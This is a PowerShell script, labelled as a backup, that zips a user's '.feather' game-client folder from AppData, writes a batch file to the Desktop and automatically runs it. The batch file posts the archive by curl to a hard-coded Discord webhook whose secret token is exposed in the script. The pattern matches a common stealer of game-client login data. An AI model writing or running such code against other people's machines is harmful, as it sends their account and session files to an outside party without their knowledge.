# Set paths
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_feather_webhook.bat'
$featherPath = 'C:\Users\haboom\AppData\Roaming\.feather'
$zipPath = Join-Path $env:TEMP 'feather_backup.zip'
$webhookUrl = 'https://discord.com/api/webhooks/1385974639590637598/I-qq5IcfJUmAbaLuA1T7hK7UM-HaQBou94NVNO7EAzuI6y1coIjL6-lm7a92wyN608Ui'

# Check if the .feather folder exists
if (-not (Test-Path $featherPath)) {
    Write-Host "ERROR: .feather folder not found at $featherPath"
    exit
}

# Remove old zip if it exists
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

# Zip the .feather folder
Compress-Archive -Path $featherPath -DestinationPath $zipPath -Force

# Create batch file content to send the zip via curl
$batchContent = @"
@echo off
setlocal

:: Discord Webhook URL
set webhookUrl=$webhookUrl

:: Path to ZIP file
set zipPath=$zipPath

:: JSON payload message
set payload_json={{\"content\":\"📦 Here is the .feather folder backup.\"}}

:: Send with curl
curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%zipPath%" 

if %errorlevel% neq 0 (
    echo ❌ Failed to send webhook.
) else (
    echo ✅ ZIP sent successfully!
)

endlocal
"@

# Write the batch file to desktop
Set-Content -Path $batchFilePath -Value $batchContent

# Notify and run the batch file
Write-Host "✅ Batch file created at: $batchFilePath"
Start-Process -FilePath $batchFilePath
Write-Host "🚀 Batch file is running..."
